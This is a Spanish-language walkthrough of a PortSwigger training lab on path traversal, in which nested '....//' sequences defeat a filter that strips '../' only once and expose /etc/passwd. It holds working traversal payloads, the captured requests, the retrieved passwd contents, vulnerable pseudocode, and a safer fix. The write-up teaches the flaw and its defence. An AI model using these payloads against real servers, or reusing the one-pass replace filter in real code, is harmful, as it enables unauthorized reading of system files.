# Write-up - PortSwigger Lab 19

Voy a hacer un laboratorio de PortSwigger. El lab 19 de Path Traversal.

URL del laboratorio:

```text
https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Laboratorio: Traversal de rutas de archivos, secuencias de traversal eliminadas de forma no recursiva

Este laboratorio contiene una vulnerabilidad de recorrido de rutas (`path traversal`) en la visualización de imágenes de productos.

La aplicación elimina las secuencias de traversal del nombre de archivo proporcionado por el usuario antes de utilizarlo.

Para resolver el laboratorio, recupera el contenido del archivo:

```text
/etc/passwd
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Objetivo principal

El objetivo del laboratorio es leer el archivo:

```text
/etc/passwd
```

Este archivo existe en sistemas Linux y contiene información de usuarios del sistema.

En este tipo de laboratorios, recuperar `/etc/passwd` demuestra que la aplicación permite leer archivos fuera del directorio permitido.

No estamos explotando una SQLi en este caso. Aunque en la conversación veníamos de laboratorios SQLi, este laboratorio pertenece a la sección de **File Path Traversal**.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Concepto clave: Path Traversal

Una vulnerabilidad de path traversal aparece cuando una aplicación permite que el usuario controle una parte de una ruta de archivo.

Ejemplo típico:

```http
GET /image?filename=24.jpg
```

La aplicación espera recibir únicamente nombres de imágenes:

```text
24.jpg
```

Internamente, puede construir una ruta como:

```text
/var/www/images/24.jpg
```

El problema aparece si el usuario cambia el valor de `filename` por una ruta manipulada, por ejemplo:

```text
../../../../../etc/passwd
```

En ese caso, si la aplicación no valida bien la entrada, puede terminar leyendo un archivo fuera del directorio de imágenes.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Diferencia con los labs anteriores de Path Traversal

## Lab simple

En el caso simple, bastaba con usar:

```text
../../../../../etc/passwd
```

## Lab con bypass mediante ruta absoluta

En el lab anterior, el servidor bloqueaba `../`, pero permitía rutas absolutas:

```text
/etc/passwd
```

## Lab actual: secuencias eliminadas de forma no recursiva

En este laboratorio, la aplicación intenta eliminar secuencias de traversal.

Es decir, si ve:

```text
../
```

las borra.

El problema es que lo hace **una sola vez**.

No vuelve a revisar el resultado después de eliminar esas secuencias.

Eso se llama limpieza no recursiva.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Qué significa “eliminadas de forma no recursiva”

Supongamos que la aplicación recibe:

```text
../../../../../etc/passwd
```

El filtro busca:

```text
../
```

y lo elimina.

Pero si construimos el payload de forma que, al eliminar una secuencia interna, se forme una nueva secuencia `../`, entonces el filtro no volverá a detectarla.

Ese es el truco.

El payload usado es:

```text
....//....//....//etc/passwd
```

A simple vista no es exactamente:

```text
../../../etc/passwd
```

Pero después de que el filtro elimine secuencias una sola vez, se transforma en:

```text
../../../etc/passwd
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Vamos a llevar a cabo esto de forma práctica

Le damos a empezar laboratorio y se nos abre la siguiente página web:

```text
https://0a0b00cc035e4e9e82bb2ae7003200dd.web-security-academy.net/
```

Una vez dentro, abrimos BurpSuitePro y en el navegador activamos FoxyProxy para que en el HTTP History vayan apareciendo las distintas requests mientras navegamos por la página.

Como ya nos dice el laboratorio, contiene una vulnerabilidad de recorrido de rutas (`path traversal`) en la visualización de imágenes de productos.

Por tanto, nos interesa localizar cómo se cargan las imágenes de los productos.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Localización del endpoint vulnerable

Clickeamos en un producto y después hacemos click derecho sobre la imagen.

Seleccionamos:

```text
Open Image In New Tab
```

Esto nos lleva a la siguiente URL:

```text
https://0a0b00cc035e4e9e82bb2ae7003200dd.web-security-academy.net/image?filename=24.jpg
```

Este parámetro es el que realmente nos interesa:

```text
image?filename=24.jpg
```

El endpoint vulnerable potencial es:

```text
/image
```

Y el parámetro que controla el archivo cargado es:

```text
filename
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Petición legítima capturada

Capturamos esa petición:

```http
GET /image?filename=24.jpg HTTP/1.1
Host: 0a0b00cc035e4e9e82bb2ae7003200dd.web-security-academy.net
Cookie: session=e7csWuxOsThlRqsOftC3R407MTeKKIlo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Análisis de la petición

La parte importante es:

```http
GET /image?filename=24.jpg HTTP/1.1
```

El servidor recibe:

```text
filename=24.jpg
```

y devuelve la imagen correspondiente.

La aplicación probablemente hace algo parecido a:

```python
open("/var/www/images/" + filename)
```

o:

```php
readfile("/var/www/images/" . $_GET["filename"]);
```

El parámetro `filename` controla qué archivo se lee.

Si la aplicación no valida correctamente ese parámetro, podemos intentar leer archivos fuera del directorio de imágenes.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Primer intento: traversal clásico

Probamos:

```http
GET /image?filename=../../../../../etc/passwd HTTP/2
```

La respuesta indica que no encuentra el archivo:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"No such file"
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Interpretación del fallo

El payload clásico no funciona.

Esto tiene sentido porque el enunciado dice que:

```text
La aplicación elimina las secuencias de traversal del nombre de archivo proporcionado por el usuario antes de utilizarlo.
```

Es decir, el servidor está intentando limpiar:

```text
../
```

Por eso:

```text
../../../../../etc/passwd
```

no llega intacto a la función que abre el archivo.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Segundo intento: ruta absoluta

También probamos con ruta absoluta:

```http
GET /image?filename=/etc/passwd HTTP/2
```

Pero ocurre lo mismo.

La aplicación no devuelve el archivo.

Esto nos dice que en este laboratorio la técnica del bypass mediante ruta absoluta tampoco es la solución.

Por tanto:

- traversal clásico: bloqueado o limpiado;
- ruta absoluta: no funciona;
- necesitamos explotar la limpieza no recursiva.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Payload correcto: secuencias anidadas

Probamos con:

```http
GET /image?filename=....//....//....//etc/passwd HTTP/2
```

Y esta vez sí funciona.

La respuesta devuelve el contenido de:

```text
/etc/passwd
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Respuesta obtenida

La respuesta es:

```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316
```

Y el cuerpo contiene:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Observación importante sobre el Content-Type

La respuesta sigue mostrando:

```http
Content-Type: image/jpeg
```

Pero el contenido real no es una imagen.

El contenido real es texto plano del archivo:

```text
/etc/passwd
```

Esto ocurre porque el endpoint `/image` está diseñado para devolver imágenes y probablemente fija siempre el tipo de contenido como `image/jpeg`.

Eso no cambia el hecho de que hemos leído correctamente un archivo del sistema.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Confirmación del laboratorio resuelto

Al volver a la web, el laboratorio aparece resuelto.

![Imagen 1](imagenes/imagen1.png)

**Referencia a la imagen 1:** Banner superior de PortSwigger indicando que el laboratorio está resuelto. Esto confirma que el contenido de `/etc/passwd` se ha recuperado correctamente mediante el bypass de limpieza no recursiva.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Bypass de Limpieza No Recursiva

## 1. El concepto de "Limpieza No Recursiva"

El enunciado dice que la aplicación:

```text
strips path traversal sequences
```

Es decir, elimina las secuencias de traversal.

La secuencia típica de traversal es:

```text
../
```

El programador ha escrito un código que busca esa cadena y la borra.

El error fatal es que lo hace de forma no recursiva.

Esto significa que el filtro pasa por el texto una sola vez.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 2. ¿Cómo funciona el "Truco del Anidamiento"?

Imagina que el servidor recibe una cadena como:

```text
....//
```

Esta cadena parece rara, pero está construida para esconder una secuencia:

```text
../
```

dentro de otra estructura.

Podemos visualizarlo así:

```text
....//
```

Si lo separamos:

```text
..  ../  /
```

La parte central contiene:

```text
../
```

El filtro elimina esa parte central.

Al eliminarla, los caracteres restantes se juntan.

Y se forma de nuevo:

```text
../
```

Pero como el filtro no vuelve a revisar la cadena, ese nuevo `../` sobrevive.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 3. Proceso paso a paso con un solo bloque

Entrada:

```text
....//
```

El filtro busca:

```text
../
```

Lo encuentra dentro de la cadena.

Después de eliminarlo, queda:

```text
../
```

Y eso es justo lo que queríamos.

El filtro intentó eliminar traversal, pero terminó creando traversal.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 4. Proceso paso a paso con el payload completo

Payload usado:

```text
....//....//....//etc/passwd
```

## Paso 1: Entrada

```text
....//....//....//etc/passwd
```

## Paso 2: El filtro busca secuencias `../`

Dentro de cada bloque `....//` hay una secuencia `../` escondida.

Visualmente:

```text
. (../) / . (../) / . (../) / etc/passwd
```

## Paso 3: El filtro elimina esas secuencias

Al borrar los `../` detectados, los caracteres restantes se colapsan entre sí.

Cada bloque:

```text
....//
```

se transforma en:

```text
../
```

## Paso 4: Payload resultante

Después de la limpieza no recursiva, el resultado final es:

```text
../../../etc/passwd
```

## Paso 5: El servidor abre el archivo

Como el filtro ya terminó y no vuelve a revisar, la cadena resultante llega a la función que abre archivos.

La aplicación termina leyendo:

```text
/etc/passwd
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Por qué el filtro falla

El filtro falla porque limpia una sola vez.

Un filtro recursivo haría algo como:

1. Eliminar `../`
2. Revisar el resultado
3. Si todavía queda `../`, eliminar otra vez
4. Repetir hasta que no quede nada peligroso

Pero aquí el filtro solo hace el paso 1.

Por eso el payload anidado funciona.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Pseudocódigo vulnerable

La aplicación podría hacer algo así:

```python
filename = filename.replace("../", "")
```

Si recibe:

```text
....//....//....//etc/passwd
```

la primera sustitución puede dejar:

```text
../../../etc/passwd
```

Y como no vuelve a llamar al filtro, esa cadena pasa a la función de lectura.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Pseudocódigo más seguro

Una defensa más robusta no debería basarse solo en reemplazos simples.

Debería resolver la ruta final y comprobar que sigue dentro del directorio permitido:

```python
base_dir = "/var/www/images"
requested_path = os.path.realpath(os.path.join(base_dir, filename))

if not requested_path.startswith(base_dir):
    raise Exception("Path traversal detected")
```

Además, sería recomendable:

- usar una whitelist de nombres de archivo;
- no aceptar barras `/` en nombres de imagen;
- no aceptar rutas absolutas;
- no aceptar secuencias codificadas;
- normalizar la ruta antes de usarla;
- comprobar la ruta canónica final.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Resumen técnico completo

La secuencia completa del laboratorio ha sido:

1. Abrimos el laboratorio.
2. Navegamos por la tienda.
3. Localizamos el endpoint de imágenes:

```http
/image?filename=24.jpg
```

4. Capturamos la petición en BurpSuite.
5. Probamos traversal clásico:

```text
../../../../../etc/passwd
```

6. No funciona.
7. Probamos ruta absoluta:

```text
/etc/passwd
```

8. Tampoco funciona.
9. Interpretamos que la aplicación elimina secuencias de traversal.
10. Probamos payload anidado:

```text
....//....//....//etc/passwd
```

11. El filtro elimina secuencias de forma no recursiva.
12. El payload se transforma en:

```text
../../../etc/passwd
```

13. El servidor lee `/etc/passwd`.
14. Recuperamos el contenido del archivo.
15. El laboratorio se marca como resuelto.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Payloads utilizados

## Petición legítima

```http
GET /image?filename=24.jpg HTTP/1.1
```

## Intento bloqueado con traversal clásico

```http
GET /image?filename=../../../../../etc/passwd HTTP/2
```

## Intento bloqueado con ruta absoluta

```http
GET /image?filename=/etc/passwd HTTP/2
```

## Payload correcto con bypass no recursivo

```http
GET /image?filename=....//....//....//etc/passwd HTTP/2
```

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Resultado obtenido

Se recuperó el contenido de:

```text
/etc/passwd
```

Entre los usuarios visibles aparecen:

```text
root
daemon
www-data
peter
carlos
user
elmer
academy
mysql
postgres
mongodb
```

Esto confirma que se ha producido lectura arbitraria de archivos.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Conclusión

Este laboratorio demuestra que eliminar cadenas peligrosas de forma superficial no es suficiente.

La aplicación intenta protegerse eliminando:

```text
../
```

Pero lo hace solo una vez.

Al usar secuencias anidadas como:

```text
....//
```

conseguimos que, tras la limpieza, se genere de nuevo:

```text
../
```

Como el filtro no vuelve a comprobar la cadena resultante, el traversal llega a la función de lectura de archivos.

FRASE CLAVE:

```text
Si el filtro borra ../ una sola vez, construye un payload que genere ../ después del borrado.
```

Payload final:

```text
....//....//....//etc/passwd
```

**Laboratorio resuelto.**

